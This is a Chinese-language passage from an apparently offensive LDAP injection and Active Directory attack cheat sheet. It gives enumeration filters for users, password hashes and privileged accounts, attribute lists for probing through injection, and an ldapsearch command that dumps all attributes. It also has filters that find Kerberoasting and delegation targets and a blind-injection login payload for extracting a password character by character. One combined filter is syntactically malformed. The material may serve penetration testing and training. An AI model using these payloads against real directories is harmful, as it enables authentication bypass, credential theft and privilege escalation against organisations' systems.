## 四、信息枚举与非标准属性利用

### 4.1 通配符与存在性枚举
```
# 枚举所有对象/用户
(objectClass=*)            → 所有条目
(objectClass=user)         → AD用户对象
(objectClass=person)       → 人对象（OpenLDAP）
(uid=*)                    → 所有uid
(sAMAccountName=*)         → AD所有账户
(mail=*@*)                 → 有邮箱对象
(userPassword=*)           → 存在密码哈希的对象
(memberOf=*)               → 有组成员关系的对象
```

### 4.2 属性字典与非标准属性（v3.0新增维度）
```
# 默认属性（*)(ATTR=* 可注入探测的属性字典，来自PATT实证）：
userPassword surname name cn sn objectClass mail givenName commonName uid
# 非标准/易被忽视的"藏宝"属性（搜索、description、注释类）：
description        → 常存明文口令/备注（HTB经典场景）
info / comment     → 备注信息
extensionAttribute1-15 → AD自定义扩展属性，企业常用其存工号/部门/手机
physicalDeliveryOfficeName / postalAddress / homePhone / pager
wWWHomePage / url / thumbnailPhoto(照片可能泄露工牌)
# AD身份类专属：
sAMAccountName userPrincipalName distinguishedName objectSid objectGUID
servicePrincipalName(SPN) userAccountControl primaryGroupID badPwdCount
whenCreated whenChanged lastLogon lastLogonTimestamp accountExpires
memberOf member msDS-AllowedToDelegateTo msDS-AllowedToActOnBehalfOfOtherIdentity
adminCount(≥1表示受保护组)  dNSHostName operatingSystem operatingSystemVersion
```
**利用姿势：** 搜索功能若回显任意属性，先请求 `*` 或 `+`（操作属性）看全部字段：
```bash
ldapsearch -x -H ldap://target -b "ou=Users,dc=corp,dc=local" "(uid=admin)" "*" "+"
```

### 4.3 AD专属属性利用（与第九章联动）
```
# 定位特权对象
(adminCount=1)                          → 受保护(高权限)组内对象
(adminCount>=1)                         → 同上（数值过滤）
(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=corp,DC=local) → 递归域管
(primaryGroupID=512)                    → Domain Admins主组
(primaryGroupID=516)                    → Domain Controllers主组

# 定位攻击面对象
(servicePrincipalName=*)                → Kerberoasting目标
(userAccountControl:1.2.840.113556.1.4.803:=65536) → 密码永不过期（多为服务账户）
(!(userAccountControl:1.2.840.113556.1.4.803:=2))  → 未禁用账户
(userAccountControl:1.2.840.113556.1.4.803:=4194304) → TrustedForDelegation(可委派)
(msDS-AllowedToDelegateTo=*)            → 约束委派目标
(msDS-AllowedToActOnBehalfOfOtherIdentity=*) → RBCD目标
(servicePrincipalName=*)&(userAccountControl:1.2.840.113556.1.4.803:=4194304) → 可Kerberoast+委派

# 识别未设置UF_DONT_EXPIRE_PASSWD的账户（弱口令喷洒优先）
```

### 4.4 敏感属性读取与密码爆破
```
# userPassword（OpenLDAP/FreeIPA）：多为{SSHA}/{CRYPT}哈希 → 离线破解
(userPassword=*)
# AD的unicodePwd不可读（LDAP限制），但可注入探测其存在性
# msKds-RootKeyData（gMSA密钥，CVE-2026-58222利用目标）：需高权限读取，注入Compare可比对

# 基于登录态的密码爆破/喷洒（结合注入的prefix搜索）：
# 已有合法低权口令时，用通配符前缀横向接管（见3.3）
# 无任何口令时，盲注prefix搜索密码：
USER = admin)(&(userPassword=M*
PASS = x
→ 命中(admin存在且密码以M开头) 逐字符提取（见第五章）
```

